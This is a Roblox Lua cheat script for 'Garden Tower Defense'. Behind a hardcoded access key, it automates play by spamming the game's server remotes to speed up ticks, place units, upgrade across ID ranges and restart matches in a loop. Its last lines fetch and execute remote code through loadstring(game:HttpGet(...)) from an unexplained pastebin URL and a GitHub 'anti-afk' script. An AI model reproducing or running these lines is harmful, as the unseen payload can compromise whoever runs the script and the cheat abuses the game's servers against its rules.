--// Garden Tower Defense Script - IMPROVED HYBRID TRACKING
local Players = game:GetService("Players")
local plr = Players.LocalPlayer

print(plr.Name .. " loaded the script. Waiting for key...")

--// Key GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = plr:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
Frame.BorderSizePixel = 0
Frame.BackgroundTransparency = 0.1
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = Frame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(80, 120, 200)
UIStroke.Thickness = 2
UIStroke.Parent = Frame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 60)
Title.BackgroundTransparency = 1
Title.Text = "GARDEN TOWER DEFENSE"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 24
Title.TextStrokeTransparency = 0.8
Title.Parent = Frame

local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(1, 0, 0, 30)
SubTitle.Position = UDim2.new(0, 0, 0, 40)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "Enter Access Key"
SubTitle.TextColor3 = Color3.fromRGB(200, 200, 220)
SubTitle.Font = Enum.Font.Gotham
SubTitle.TextSize = 16
SubTitle.Parent = Frame

local TextBoxContainer = Instance.new("Frame")
TextBoxContainer.Size = UDim2.new(1, -40, 0, 50)
TextBoxContainer.Position = UDim2.new(0, 20, 0, 90)
TextBoxContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
TextBoxContainer.BorderSizePixel = 0
TextBoxContainer.Parent = Frame

local TextBoxCorner = Instance.new("UICorner")
TextBoxCorner.CornerRadius = UDim.new(0, 8)
TextBoxCorner.Parent = TextBoxContainer

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(1, -20, 1, -10)
TextBox.Position = UDim2.new(0, 10, 0, 5)
TextBox.PlaceholderText = "Enter key here..."
TextBox.Text = ""
TextBox.Font = Enum.Font.Gotham
TextBox.TextSize = 18
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1
TextBox.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
TextBox.Parent = TextBoxContainer

local CheckBtn = Instance.new("TextButton")
CheckBtn.Size = UDim2.new(1, -40, 0, 50)
CheckBtn.Position = UDim2.new(0, 20, 0, 160)
CheckBtn.Text = "VERIFY KEY"
CheckBtn.Font = Enum.Font.GothamBold
CheckBtn.TextSize = 18
CheckBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CheckBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 200)
CheckBtn.BorderSizePixel = 0
CheckBtn.Parent = Frame

local CheckBtnCorner = Instance.new("UICorner")
CheckBtnCorner.CornerRadius = UDim.new(0, 8)
CheckBtnCorner.Parent = CheckBtn

local Label = Instance.new("TextLabel")
Label.Size = UDim2.new(1, -40, 0, 40)
Label.Position = UDim2.new(0, 20, 0, 220)
Label.BackgroundTransparency = 1
Label.Text = ""
Label.Font = Enum.Font.Gotham
Label.TextSize = 14
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.TextWrapped = true
Label.Parent = Frame

--// Remotes
local rs = game:GetService("ReplicatedStorage")
local remotes = rs:WaitForChild("RemoteFunctions")

task.delay(2, function()
    pcall(function()
        remotes.ToggleAutoSkip:InvokeServer(true)
        warn("[System] Auto Skip Enabled")
    end)
end)

--=== IMPROVED HYBRID SYSTEM ===--
function loadHybridTracking()
    warn("[System] Loaded IMPROVED HYBRID TRACKING")
    
    remotes.ChangeTickSpeed:InvokeServer(3)

    -- Track placed unit IDs
    local placedUnitIds = {
        tomatoes = {},
        metalFlowers = {},
        potatoes = {}
    }
    
    local nextExpectedId = 1

    -- Upgrade function
    local function upgradeUnit(unitId)
        pcall(function()
            remotes.UpgradeUnit:InvokeServer(unitId)
        end)
    end

    -- Place function with ID tracking
    local function placeUnit(unitName, data)
        local success = pcall(function()
            remotes.PlaceUnit:InvokeServer(unitName, data)
        end)
        
        if success then
            warn("[Placed] " .. unitName .. " - Tracking ID: " .. nextExpectedId)
            
            -- Track the ID
            if unitName == "unit_tomato_rainbow" then
                table.insert(placedUnitIds.tomatoes, nextExpectedId)
            elseif unitName == "unit_metal_flower" then
                table.insert(placedUnitIds.metalFlowers, nextExpectedId)
            elseif unitName == "unit_punch_potato" then
                table.insert(placedUnitIds.potatoes, nextExpectedId)
            end
            
            nextExpectedId = nextExpectedId + 1
            return true
        else
            warn("[Failed] " .. unitName)
            return false
        end
    end

    -- Upgrade loops that use tracked IDs + backup ranges
    local function upgradeTomatoes()
        while true do
            -- Upgrade tracked IDs
            for _, id in ipairs(placedUnitIds.tomatoes) do
                upgradeUnit(id)
            end
            -- Backup: also try nearby IDs
            for id = 1, 30 do
                upgradeUnit(id)
            end
            task.wait(0.5)
        end
    end

    local function upgradeMetalFlowers()
        while true do
            for _, id in ipairs(placedUnitIds.metalFlowers) do
                upgradeUnit(id)
            end
            for id = 20, 60 do
                upgradeUnit(id)
            end
            task.wait(0.5)
        end
    end

    local function upgradePotatoes()
        while true do
            for _, id in ipairs(placedUnitIds.potatoes) do
                upgradeUnit(id)
                upgradeUnit(id) -- Double upgrade for potatoes
            end
            for id = 60, 120 do
                upgradeUnit(id)
            end
            task.wait(0.2)
        end
    end

    -- Unit placements
    local unitPlacements = {
        {time = 5, unit = "unit_tomato_rainbow", data = {Valid = true, Rotation = 180, CF = CFrame.new(-850.7767333984375, 61.93030548095703, -155.0453338623047, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1), Position = Vector3.new(-850.7767333984375, 61.93030548095703, -155.0453338623047)}},
        {time = 55, unit = "unit_tomato_rainbow", data = {Valid = true, Rotation = 180, CF = CFrame.new(-852.2405395507812, 61.93030548095703, -150.1680450439453, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1), Position = Vector3.new(-852.2405395507812, 61.93030548095703, -150.1680450439453)}},
        {time = 85, unit = "unit_metal_flower", data = {Valid = true, Rotation = 180, CF = CFrame.new(-850.2332153320312, 61.93030548095703, -151.0040740966797, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1), Position = Vector3.new(-850.2332153320312, 61.93030548095703, -151.0040740966797)}},
        {time = 100, unit = "unit_metal_flower", data = {Valid = true, Rotation = 180, CF = CFrame.new(-853.2742919921875, 61.93030548095703, -146.7690887451172, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1), Position = Vector3.new(-853.2742919921875, 61.93030548095703, -146.7690887451172)}},
        {time = 115, unit = "unit_metal_flower", data = {Valid = true, Rotation = 180, CF = CFrame.new(-857.4375, 61.93030548095703, -148.3301239013672, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1), Position = Vector3.new(-857.4375, 61.93030548095703, -148.3301239013672)}},
        {time = 185, unit = "unit_punch_potato", data = {Valid = true, Rotation = 180, CF = CFrame.new(-851.727783203125, 61.93030548095703, -135.6544952392578, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1), Position = Vector3.new(-851.727783203125, 61.93030548095703, -135.6544952392578)}},
        {time = 190, unit = "unit_punch_potato", data = {Valid = true, Rotation = 180, CF = CFrame.new(-851.33349609375, 61.93030548095703, -133.5747833251953, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1), Position = Vector3.new(-851.33349609375, 61.93030548095703, -133.5747833251953)}},
        {time = 195, unit = "unit_punch_potato", data = {Valid = true, Rotation = 180, CF = CFrame.new(-846.9492797851562, 61.93030548095703, -133.9480743408203, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1), Position = Vector3.new(-846.9492797851562, 61.93030548095703, -133.9480743408203)}}
    }

    -- Main game loop
    local function mainGameLoop()
        while true do
            warn("[GAME START] New cycle starting...")
            
            -- Reset for new game
            placedUnitIds = {tomatoes = {}, metalFlowers = {}, potatoes = {}}
            nextExpectedId = 1
            
            remotes.ChangeTickSpeed:InvokeServer(3)
            remotes.PlaceDifficultyVote:InvokeServer("dif_hard")
            
            -- Place units
            for _, placement in ipairs(unitPlacements) do
                task.delay(placement.time, function()
                    placeUnit(placement.unit, placement.data)
                end)
            end
            
            -- Start upgrades
            task.delay(6, function()
                warn("[UPGRADES] Tomatoes starting")
                task.spawn(upgradeTomatoes)
            end)
            
            task.delay(86, function()
                warn("[UPGRADES] Metal Flowers starting")
                task.spawn(upgradeMetalFlowers)
            end)
            
            task.delay(186, function()
                warn("[UPGRADES] Potatoes starting")
                task.spawn(upgradePotatoes)
            end)
            
            task.wait(300)
            warn("[RESTART] Restarting...")
            remotes.RestartGame:InvokeServer()
            task.wait(5)
        end
    end

    mainGameLoop()
end

--=== KEY CHECK ===--
CheckBtn.MouseButton1Click:Connect(function()
    if TextBox.Text:upper() == "GTD2025" then
        Label.Text = "✅ Key Verified!"
        Label.TextColor3 = Color3.fromRGB(100, 255, 100)
        CheckBtn.BackgroundColor3 = Color3.fromRGB(80, 180, 80)
        CheckBtn.Text = "SUCCESS!"
        
        task.delay(1.5, function()
            ScreenGui:Destroy()
            loadHybridTracking()
        end)
    else
        TextBox.Text = ""
        Label.Text = "❌ Invalid Key!"
        Label.TextColor3 = Color3.fromRGB(255, 100, 100)
        CheckBtn.BackgroundColor3 = Color3.fromRGB(200, 80, 80)
        
        task.delay(1, function()
            CheckBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 200)
            CheckBtn.Text = "VERIFY KEY"
        end)
    end
end)

loadstring(game:HttpGet("https://pastebin.com/raw/HkAmPckQ"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()

ScreenGui.DisplayOrder = 999
print("Script loaded!")
